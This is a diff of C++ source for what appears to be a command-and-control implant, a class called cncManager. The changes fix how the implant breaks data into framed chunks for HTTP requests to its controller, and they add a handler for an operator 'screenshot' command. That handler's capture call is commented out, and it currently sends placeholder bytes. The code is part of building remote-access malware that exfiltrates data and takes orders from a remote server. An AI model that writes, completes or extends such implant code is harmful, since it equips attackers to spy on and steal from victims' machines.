@@ -117,12 +117,11 @@ void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
             dataFrame->type = DDtype;
             dataFrame->len = MAX_DATA_LEN;
             dataFrame->seq = seq;
-
             UCHAR* stream = new UCHAR[MAX_DATA_LEN + sizeof(DDprotocol)];
             memset(stream, 0, sizeof(DDprotocol) + MAX_DATA_LEN);
             memcpy(stream, dataFrame, sizeof(DDprotocol));
-            memcpy(stream + sizeof(DDprotocol), (UCHAR *)data + sended_offset, MAX_DATA_LEN);
-            this->sendHttpRequest((LPVOID)stream, MAX_DATA_LEN);
+            memcpy(stream + sizeof(DDprotocol), (LPVOID)((UCHAR *)data + sended_offset), MAX_DATA_LEN);
+            this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + MAX_DATA_LEN);
             seq++;
             left_offset -= MAX_DATA_LEN;
             sended_offset += MAX_DATA_LEN;
@@ -211,8 +210,10 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
             case ftpRequest:
             {
                 this->printParsedResponse(resData, "FTP_REQUEST");
-                if (!data.compare("screen")) {
-                    
+                if (!data.compare("screenshot")) {
+                    //commandManager cmd;
+                    //cmd.getScreen();
+                    this->sendData(ftpResponse, 10, (LPVOID)"abcdeabcde");
                 }
                 break;
 
@@ -220,7 +221,7 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
             
             case none:
             {
-                this->printParsedResponse(resData, "NONE");
+                //this->printParsedResponse(resData, "NONE");
                 break;
             }
                 
